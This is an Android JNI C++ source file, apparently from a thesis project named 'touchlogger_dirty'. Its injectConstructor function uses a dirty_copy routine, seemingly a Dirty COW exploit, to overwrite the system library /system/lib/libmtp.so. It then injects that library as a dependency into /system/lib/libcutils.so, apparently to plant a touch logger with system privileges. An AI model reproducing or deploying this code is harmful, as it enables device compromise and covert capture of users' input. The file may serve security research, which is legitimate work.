#include <jni.h>
#include <string>
#include <android/log.h>

#include "dirty_copy.h"

extern "C"
JNIEXPORT void JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_activity_MainActivity_injectConstructor(JNIEnv *env, jclass type,
                                                                          jstring srcPath_) {
  const char *srcPath = env->GetStringUTFChars(srcPath_, 0);

  struct stat st;

  int f = open(srcPath, O_RDONLY);
  if (f == -1) {
    __android_log_print(ANDROID_LOG_WARN, "Dirty", "could not open %s", srcPath);
  }
  if (fstat(f, &st) == -1) {
    __android_log_print(ANDROID_LOG_WARN, "Dirty", "could not stat %s", srcPath);
  }

  __android_log_print(ANDROID_LOG_WARN, "Dirty", "Size: %llu", st.st_size);
  close(f);

  dirty_copy(srcPath, "/system/lib/libmtp.so");
  inject_dependency_into_library("/system/lib/libcutils.so", "libmtp.so");

  env->ReleaseStringUTFChars(srcPath_, srcPath);
}

extern "C"
JNIEXPORT jstring JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_activity_MainActivity_stringFromJNI(JNIEnv *env,
                                                                              jobject instance) {
  std::string hello = "Hello from C++";
  return env->NewStringUTF(hello.c_str());
}
